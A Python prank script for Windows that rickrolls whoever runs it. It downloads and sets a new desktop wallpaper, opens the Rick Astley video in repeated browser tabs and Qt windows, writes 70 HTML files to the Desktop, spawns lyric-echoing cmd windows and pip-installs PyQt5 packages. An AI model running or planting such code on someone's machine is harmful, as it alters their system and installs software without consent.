import time
import os
import urllib.request
desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
os.chdir(desktop)
with urllib.request.urlopen('https://i.ibb.co/jWvQKpJ/rickroll-4k.jpg') as response:
   content = response.read()
   file = open("rickroll.jpg", "wb")
   file.write(content)
   file.close()
path='rickroll.jpg'
import ctypes
SPI_SETDESKWALLPAPER = 20
ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.join(desktop,path), 3)
time.sleep(1)
print('Hello')
time.sleep(1)
print('Are You Ready?')
time.sleep(2)
print('3...')
time.sleep(1)
print('2...')
time.sleep(1)
print('1...')
time.sleep(1)
print("Let's go!!!")
import webbrowser
for i in range(5):
    webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
for i in range(70):
    with open(f'index{i}.html','w') as file:
        file.write("""<iframe width="100%" height="100%" src="https://www.youtube.com/embed/GtL1huin9EE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>""")
for i in range(10):
    os.system('cmd /k "echo Never gonna give you up & echo Never gonna let you down & echo Never gonna run around and desert you & echo Never gonna make you cry & echo Never gonna say goodbye & echo Never gonna tell a lie and hurt you"')

os.system('cmd /k "pip install PyQt5 & pip install PyQtWebEngine"')
import sys
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtWebEngineWidgets import *

class MainWindow(QMainWindow):
    def __init__(self):
        super(MainWindow, self).__init__()
        self.browser = QWebEngineView()
        self.browser.setUrl(QUrl('https://www.youtube.com/watch?v=dQw4w9WgXcQ'))
        self.setCentralWidget(self.browser)
        self.showMaximized()
app = QApplication(sys.argv)
QApplication.setApplicationName('You have been rickrolled')
for i in range(10):
    window = MainWindow()
    app.exec_()
